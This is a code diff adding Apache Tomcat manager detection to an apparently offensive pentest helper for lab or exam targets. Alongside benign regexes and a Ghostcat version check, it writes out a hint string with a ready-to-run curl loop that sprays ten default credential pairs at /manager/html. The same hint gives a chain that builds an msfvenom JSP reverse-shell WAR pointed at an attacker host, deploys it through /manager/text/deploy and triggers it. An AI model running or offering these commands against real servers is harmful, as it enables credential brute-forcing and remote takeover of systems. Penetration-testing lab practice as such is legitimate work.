@@ -1940,6 +1940,29 @@ _AJP_GNMAP = re.compile(
     r'(?i)Host:\s+([\w.:]+)[^\r\n]*8009/open/tcp//ajp13?/'
 )
 
+# iter-228: Apache Tomcat web-manager exposure. Prior iter-213
+# handled AJP:8009 (Ghostcat). This is the HTTP:8080/8443/9000
+# side: /manager/html + /host-manager which accept HTTP Basic auth
+# with default creds on countless lab boxes.
+#
+# Signal A: `Apache Tomcat/X.Y.Z` banner from nmap http-server-header
+# script OR from raw `Server:` response header.
+_TOMCAT_VERSION = re.compile(
+    r'(?i)Apache[- ]Tomcat[/-](\d+(?:\.\d+){1,3})'
+)
+# Signal B: captured HTTP request or response referencing the
+# manager path - either a curl attempt (`GET /manager/html`) or a
+# 401 challenge from `WWW-Authenticate: Basic realm="Tomcat
+# Manager Application"`.
+_TOMCAT_MANAGER_401 = re.compile(
+    r'(?i)WWW-Authenticate\s*:\s*Basic\s+realm\s*=\s*["\']?'
+    r'(?:Tomcat\s+Manager\s+Application|Tomcat\s+Manager)["\']?'
+)
+_TOMCAT_MANAGER_PATH = re.compile(
+    r'(?i)(?:(?:GET|POST|HEAD)\s+/|https?://[^/\r\n\s]{3,80}/)'
+    r'(?:manager|host-manager)/(?:html|text|status)'
+)
+
 # iter-227: LDAP anonymous bind confirmed via rootDSE dump. On AD
 # labs the anonymous bind + rootDSE read gives:
 #   * defaultNamingContext = DC=corp,DC=local        (target domain)
@@ -2772,6 +2795,67 @@ def _multiline_passes(path, report, store):
                              f"impacket-GetNPUsers "
                              f"{_dc_fqdn.split('.', 1)[-1] if '.' in _dc_fqdn else '<domain>'}/ "
                              f"-dc-ip {_ldap_ip} -request -no-pass"))
+
+    # iter-228: Apache Tomcat web-manager exposure. Emit HIGH RECON
+    # when we see EITHER (a) the Tomcat version banner AND some
+    # signal the manager path is reachable, OR (b) an explicit 401
+    # Basic realm="Tomcat Manager" challenge. Doc-file gate applies.
+    if not filters.is_doc_file(path):
+        _tv_m = _TOMCAT_VERSION.search(text[:32768])
+        _t_manager_seen = (
+            _TOMCAT_MANAGER_401.search(text[:16384])
+            or _TOMCAT_MANAGER_PATH.search(text[:16384]))
+        # Fire when we have EITHER a 401 realm challenge (dispositive)
+        # OR (version banner + manager path reference).
+        _tomcat_fire = (
+            _TOMCAT_MANAGER_401.search(text[:16384]) is not None
+            or (_tv_m and _t_manager_seen))
+        if _tomcat_fire:
+            _tv_str = _tv_m.group(1) if _tv_m else "unknown"
+            _tomcat_host_m = re.search(
+                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
+                text[:16384])
+            _thost = (_tomcat_host_m.group(1) if _tomcat_host_m
+                       else "<tomcat-host>")
+            # CVE hint by version.
+            _cve_hint = ""
+            if _tv_m:
+                try:
+                    _tmj, _tmn, _tpt = [
+                        int(x) for x in
+                        (_tv_str.split(".") + ["0", "0"])[:3]]
+                    # Tomcat 9.0.31 / 8.5.51 / 7.0.100 fix Ghostcat.
+                    if (_tmj, _tmn, _tpt) < (7, 0, 100) or (
+                            _tmj == 8 and _tmn == 5 and
+                            _tpt < 51) or (
+                            _tmj == 9 and _tmn == 0 and _tpt < 31):
+                        _cve_hint = ("  |  ALSO Ghostcat CVE-2020-1938 "
+                                     "candidate - check AJP:8009")
+                except (ValueError, IndexError):
+                    pass
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_tv_m or _TOMCAT_MANAGER_401.search(text)
+                            or _TOMCAT_MANAGER_PATH.search(text)),
+                       f"Tomcat {_tv_str} manager exposed on {_thost} "
+                       f"- try default cred spray",
+                       hint=(f"top-10 default sprays: for c in "
+                             f"tomcat:tomcat admin:admin admin:tomcat "
+                             f"admin:password tomcat:password "
+                             f"tomcat:s3cret tomcat:manager "
+                             f"admin:admin123 admin:changeme root:root; "
+                             f"do curl -sI -u \"$c\" http://{_thost}"
+                             f":8080/manager/html | head -1 | grep -v "
+                             f"401 && echo FOUND:$c; done  |  post-cred "
+                             f"WAR upload chain: msfvenom -p java/jsp_"
+                             f"shell_reverse_tcp LHOST=<ATTACKER> "
+                             f"LPORT=4444 -f war -o rev.war  (counts "
+                             f"toward one-target msfvenom quota); "
+                             f"curl -u <cred> --upload-file rev.war "
+                             f"http://{_thost}:8080/manager/text/deploy"
+                             f"?path=/rev; then GET /rev/  |  "
+                             f"exam-legal manual: build WAR by hand "
+                             f"with jar cvf rev.war shell.jsp (no "
+                             f"msfvenom quota cost){_cve_hint}"))
 
     # iter-199: OpenSSH banner detection + CVE range flags. Emits INFO
     # RECON per unique version + a HIGH marker for each known-vulnerable
